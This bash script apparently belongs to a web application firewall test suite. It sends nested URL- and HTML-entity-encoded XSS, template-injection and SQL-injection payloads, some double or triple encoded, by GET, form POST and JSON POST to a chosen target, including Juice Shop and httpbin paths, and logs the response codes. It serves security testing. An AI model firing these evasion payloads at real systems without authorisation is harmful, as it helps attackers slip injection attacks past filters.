#!/bin/bash
# Mixed and nested multi-layer encoding evasion
# Tests WAF decode pipeline depth: URL(HTML(payload)), double-URL(entity), etc.
# Estimated duration: 1-2 minutes
set -euo pipefail

TARGET="${1:?Usage: 04-mixed-nested-encoding.sh <TARGET_FQDN>}"
BASE="${TARGET_PROTOCOL:-http}://${TARGET}"

echo "[*] Mixed/Nested Encoding Evasion against ${TARGET}"
echo ""

echo "[+] URL-encoded HTML entities"
PAYLOADS=(
  # User's specific example: {{7*7}} via URL-encoded decimal entities
  "template-inject-urlenc|%26%23123%3B%26%23123%3B7*7%26%23125%3B%26%23125%3B"
  # URL-encoded decimal entity for < then script
  "xss-urlenc-decimal|%26%2360%3Bscript%26%2362%3Ealert(1)%26%2360%3B/script%26%2362%3E"
  # URL-encoded hex entity for <script>
  "xss-urlenc-hex|%26%23x3c%3Bscript%26%23x3e%3Ealert(1)%26%23x3c%3B/script%26%23x3e%3E"
  # Double-URL inside HTML entity
  "xss-double-url-entity|%2526%252360%253Bscript%2526%252362%253E"
  # URL-encoded named entity
  "xss-urlenc-named|%26lt%3Bscript%26gt%3Balert(1)%26lt%3B/script%26gt%3B"
  # SQLi via URL-encoded entity for single quote
  "sqli-urlenc-entity|%26%2339%3B%20OR%201%3D1--"
  # Triple layer: URL(URL(HTML-decimal))
  "triple-layer|%25252623x3c%25253Bscript%25252623x3e%25253E"
)

for entry in "${PAYLOADS[@]}"; do
  name="${entry%%|*}"
  payload="${entry#*|}"
  echo "[+] ${name}"
  for ep in "/?q=" "/httpbin/get?q=" "/juice-shop/rest/products/search?q="; do
    code=$(curl -sk -o /dev/null -w "%{http_code}" \
      "${BASE}${ep}${payload}" --max-time 10) || code="ERR"
    printf "    GET  %-35s -> HTTP %s\n" "${ep}" "${code}"
  done
  code=$(curl -sk -o /dev/null -w "%{http_code}" \
    -X POST "${BASE}/" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "test=${payload}" --max-time 10) || code="ERR"
  printf "    POST %-35s -> HTTP %s\n" "/" "${code}"
  echo ""
done

echo "[+] JSON body with encoded payloads"
JSON_PAYLOADS=(
  '{"q":"<script>alert(1)</script>"}'
  '{"q":"\\u003cscript\\u003ealert(1)\\u003c/script\\u003e"}'
  '{"q":"\\x3cscript\\x3ealert(1)\\x3c/script\\x3e"}'
  "{\"q\":\"\\u0027 OR 1=1--\"}"
  '{"q":"{{7*7}}"}'
)

for payload in "${JSON_PAYLOADS[@]}"; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" \
    -X POST "${BASE}/httpbin/post" \
    -H "Content-Type: application/json" \
    -d "${payload}" --max-time 10) || code="ERR"
  printf "    JSON %-50s -> HTTP %s\n" "${payload:0:50}" "${code}"
done
echo ""

echo "[*] Mixed/nested encoding evasion complete"
